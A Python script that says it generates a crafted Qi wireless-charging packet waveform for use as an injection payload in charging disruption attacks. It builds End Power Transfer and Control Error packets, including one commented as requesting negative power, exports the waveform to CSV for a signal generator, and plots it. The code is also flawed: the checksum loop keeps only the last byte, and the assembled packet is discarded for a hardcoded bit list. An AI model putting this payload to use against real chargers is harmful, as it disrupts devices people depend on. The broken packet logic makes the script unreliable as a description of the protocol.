# Create a custom qi packet wavefrom that can be loaded onto a waveform generator and used as an injection payload for qi
# charging disruption attacks

import numpy as np
import matplotlib.pyplot as plt
import binascii

PREAMBLE_BIT_SIZE = 16
CLOCK_FREQUENCY = 150
SAMPLING_RATE = 44100

def generate_packet():
    # craft a power control packet that uses the qi protocol

    # packet preamble (11-25 bits all set to 1)
    temp = 0xfffffff
    preamble = [1] * PREAMBLE_BIT_SIZE # x bit preamble
    print(f'Preamble: {preamble}')

    # generate header
    # EPT End Power Transfer Power control 1
    ept_packet_header = 0x02
    # CE Control Error Packet control 1
    ce_packet_header = 0x03
    header_hex = ept_packet_header
    header_bin = bin(header_hex)[2:]
    print(f'Header: {header_bin}')

    # generate packet message
    data_message_hex = 0x2357 # Example data message as hex
    ce_data_message_hex = 0x0000 # Example data message as hex
    ce_data_message_hex_deplete = 0x049c96 #attempt to request -100 power
    ept_data_message_hex = 0x0000 
    
    selected_data_message_hex = ce_data_message_hex
    data_message_bin =  bin(selected_data_message_hex)[2:]
    data_bin_arr = [data_message_bin[i:i+8].zfill(8) for i in range(0, len(data_message_bin), 8)]
    print(f'Data Message: {data_bin_arr}')


    # generate packet checksum
    # checksum is calculated by xoring the header and each byte of the data message
    for byte in data_bin_arr:
        checksum = int(header_bin,2) ^ int(byte,2)
    print(f'Checksum: {bin(checksum)[2:]}')

    #assemble packet
    packet = preamble + [int(x) for x in header_bin] + [int(x) for x in data_message_bin] + [int(x) for x in bin(checksum)[2:]]
    print(f'Packet: {packet}')

    # Convert binary to list of integers
    data = [int(x) for x in data_message_bin]
    print(data)

    # Existing signal data
    data = [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,  0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,]

    #return packet
    return data

def generate_waveform():
    # Define the clock frequency and sample rate
    clock_frequency = CLOCK_FREQUENCY
    sampling_rate = SAMPLING_RATE

    data = generate_packet()

    # Define the time vector
    t = np.linspace(0, len(data)/clock_frequency, int(sampling_rate/clock_frequency*len(data)), endpoint=False)

    # Create the waveform
    waveform = np.zeros(t.shape)
    for i in range(len(data)):
        if data[i] == 1:
            waveform[int(i*sampling_rate/clock_frequency):int((i+0.5)*sampling_rate/clock_frequency)] = 15
            waveform[int((i+0.5)*sampling_rate/clock_frequency):int((i+1)*sampling_rate/clock_frequency)] = 14
        else:
            if i % 2 == 0:
                waveform[int(i*sampling_rate/clock_frequency):int((i+1)*sampling_rate/clock_frequency)] = 15
            else:
                waveform[int(i*sampling_rate/clock_frequency):int((i+1)*sampling_rate/clock_frequency)] = 14

    # Export as csv
    np.savetxt("crafted_waveform.csv", waveform, delimiter=",")

    return waveform, t

def graph_waveform():
    waveform, t = generate_waveform()

    # Plot the waveform
    plt.plot(t, waveform)
    plt.xlabel('Time (s)')
    plt.ylabel('Amplitude (V)')
    plt.ylim([0,20])
    plt.title('Signal waveform')
    plt.show()

def main():
    #generate_waveform()
    graph_waveform()

if __name__ == "__main__":
    main()
